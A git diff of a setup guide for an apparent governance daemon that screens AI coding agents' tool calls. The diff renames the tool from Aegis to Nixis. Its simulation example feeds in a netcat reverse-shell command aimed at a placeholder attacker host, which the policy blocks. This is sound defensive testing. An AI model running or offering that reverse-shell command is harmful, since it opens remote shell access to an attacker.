@@ -4,13 +4,13 @@
 
 - **Go 1.25+** — [install](https://go.dev/dl/)
 - **Node 20+** — for the dashboard ([nvm](https://github.com/nvm-sh/nvm) recommended; the repo includes `.nvmrc`)
-- **macOS or Linux** — Aegis uses Unix domain sockets for hook-daemon communication
+- **macOS or Linux** — Nixis uses Unix domain sockets for hook-daemon communication
 
 ## Build from Source
 
 ```bash
-git clone https://github.com/mayjain/aegis.git
-cd aegis
+git clone https://github.com/mayjain/nixis.git
+cd nixis
 go build -o bin/ ./cmd/...
 ```
 
@@ -18,9 +18,9 @@ Produces three binaries:
 
 | Binary | Purpose |
 |--------|---------|
-| `bin/aegis` | Policy validation, simulation, auditing |
-| `bin/aegis-daemon` | Governance daemon |
-| `bin/aegis-hook` | IDE hook (per tool call) |
+| `bin/nixis` | Policy validation, simulation, auditing |
+| `bin/nixis-daemon` | Governance daemon |
+| `bin/nixis-hook` | IDE hook (per tool call) |
 
 ## Configuration
 
@@ -32,29 +32,29 @@ Defaults work out of the box:
 
 | Variable | Default | Purpose |
 |----------|---------|---------|
-| `AEGIS_DASHBOARD_ADDR` | `:9090` | WebSocket server address for dashboard |
-| `AEGIS_GRPC_ADDR` | *(disabled)* | gRPC ext_authz listener for Envoy/Istio |
-| `AEGIS_OTEL_ENDPOINT` | *(disabled)* | OTLP gRPC endpoint for traces and metrics |
-| `LITELLM_API_KEY` | *(optional)* | Only needed for `aegis import` (LLM-powered policy translation) |
+| `NIXIS_DASHBOARD_ADDR` | `:9090` | WebSocket server address for dashboard |
+| `NIXIS_GRPC_ADDR` | *(disabled)* | gRPC ext_authz listener for Envoy/Istio |
+| `NIXIS_OTEL_ENDPOINT` | *(disabled)* | OTLP gRPC endpoint for traces and metrics |
+| `LITELLM_API_KEY` | *(optional)* | Only needed for `nixis import` (LLM-powered policy translation) |
 
 The daemon also accepts flags directly:
 
 ```bash
-./bin/aegis-daemon -socket /tmp/aegis.sock -policy-dir policies/ -audit-db ~/.aegis/audit.db
+./bin/nixis-daemon -socket /tmp/nixis.sock -policy-dir policies/ -audit-db ~/.nixis/audit.db
 ```
 
 ## Start the Daemon
 
 ```bash
-./bin/aegis-daemon
+./bin/nixis-daemon
 ```
 
 You should see output confirming it bound the socket and loaded policies:
 
 ```
-aegis-daemon: listening on /tmp/aegis.sock
-aegis-daemon: loaded 19 policies from policies/builtin/
-aegis-daemon: dashboard stream available at :9090
+nixis-daemon: listening on /tmp/nixis.sock
+nixis-daemon: loaded 19 policies from policies/builtin/
+nixis-daemon: dashboard stream available at :9090
 ```
 
 The daemon recursively loads all `.yaml` files from the policy directory. It watches for changes via `fsnotify` and hot-reloads without restart.
@@ -71,7 +71,7 @@ Add to your Claude Code `settings.json` (typically at `~/.claude/settings.json`)
     "PreToolUse": [
       {
         "type": "command",
-        "command": "/path/to/aegis/bin/aegis-hook"
+        "command": "/path/to/nixis/bin/nixis-hook"
       }
     ]
   }
@@ -90,7 +90,7 @@ Cursor uses the same hook protocol. Add to your project's `.cursor/hooks.json`:
     "PreToolUse": [
       {
         "type": "command",
-        "command": "/path/to/aegis/bin/aegis-hook"
+        "command": "/path/to/nixis/bin/nixis-hook"
       }
     ]
   }
@@ -104,7 +104,7 @@ The hook auto-detects which IDE is calling based on the input format.
 With the daemon running, simulate a tool call:
 
 ```bash
-./bin/aegis simulate Bash --session test-001 --args '{"command":"nc -e /bin/sh evil.com 4444"}'
+./bin/nixis simulate Bash --session test-001 --args '{"command":"nc -e /bin/sh evil.com 4444"}'
 ```
 
 Expected output:
@@ -117,14 +117,14 @@ reason=Netcat with execute flag (-e/-c) is blocked — this creates a reverse sh
 Try an allowed operation:
 
 ```bash
-./bin/aegis simulate Bash --session test-002 --args '{"command":"ls -la"}'
+./bin/nixis simulate Bash --session test-002 --args '{"command":"ls -la"}'
 ```
 
 ```
 action=allow policy= layer=adapter latency=3167000ns
 ```
 
-> **Security property (fail-open):** If the daemon is unreachable (crashed, not started), the hook **allows all requests** and logs them to `~/.aegis/failopen.log` for later reconciliation. This prioritizes developer productivity over enforcement during daemon outages. Run the daemon under a process supervisor (systemd, launchd — see `deploy/`) for persistent enforcement.
+> **Security property (fail-open):** If the daemon is unreachable (crashed, not started), the hook **allows all requests** and logs them to `~/.nixis/failopen.log` for later reconciliation. This prioritizes developer productivity over enforcement during daemon outages. Run the daemon under a process supervisor (systemd, launchd — see `deploy/`) for persistent enforcement.
 
 ## Launch the Dashboard
 
@@ -144,26 +144,26 @@ Open [http://localhost:5173](http://localhost:5173). The dashboard connects to t
 
 If no daemon is running, the dashboard operates in demo mode with simulated events.
 
-> **Known limitation:** The Policy Playground currently uses pattern-based matching rather than full CEL evaluation. Live policy testing works through `aegis simulate` on the CLI.
+> **Known limitation:** The Policy Playground currently uses pattern-based matching rather than full CEL evaluation. Live policy testing works through `nixis simulate` on the CLI.
 
 ## Validate Your Policies
 
 Check that all policy files parse correctly:
 
 ```bash
-./bin/aegis validate --dir policies/
+./bin/nixis validate --dir policies/
 ```
 
 ## Troubleshooting
 
 **Hook seems to do nothing / all requests allowed:**
-The daemon isn't running (or isn't reachable at the expected socket path). The hook fails open silently. Start the daemon and check `~/.aegis/failopen.log` for missed requests.
+The daemon isn't running (or isn't reachable at the expected socket path). The hook fails open silently. Start the daemon and check `~/.nixis/failopen.log` for missed requests.
 
 **Policies not reloading after file change:**
 Check daemon stderr for CEL parse errors. If a policy file has invalid YAML or bad CEL syntax, the daemon retains the previous valid snapshot and logs the error. Fix the syntax and save again.
 
 **Connection refused / timeout:**
-The daemon binds to `/tmp/aegis.sock` by default. If you changed the path via `-socket` or `$AEGIS_SOCKET_PATH`, the hook must use the same path. Set `AEGIS_SOCKET_PATH` in your shell environment.
+The daemon binds to `/tmp/nixis.sock` by default. If you changed the path via `-socket` or `$NIXIS_SOCKET_PATH`, the hook must use the same path. Set `NIXIS_SOCKET_PATH` in your shell environment.
 
 **Permission denied on socket:**
 The daemon and hook must run as the same user (the socket inherits the creating process's ownership).
@@ -177,13 +177,13 @@ Confirm the daemon is running with the dashboard WebSocket enabled (default `:90
 
 ```bash
 # Find and stop the daemon
-kill $(lsof -t /tmp/aegis.sock 2>/dev/null)
+kill $(lsof -t /tmp/nixis.sock 2>/dev/null)
 ```
 
 **Permanent removal:**
 1. Remove the hook entry from your IDE settings (`hooks.json` or `settings.json`)
 2. Stop the daemon
-3. Optionally remove data: `rm -rf ~/.aegis/ /tmp/aegis.sock`
+3. Optionally remove data: `rm -rf ~/.nixis/ /tmp/nixis.sock`
 
 ## What's Next
 
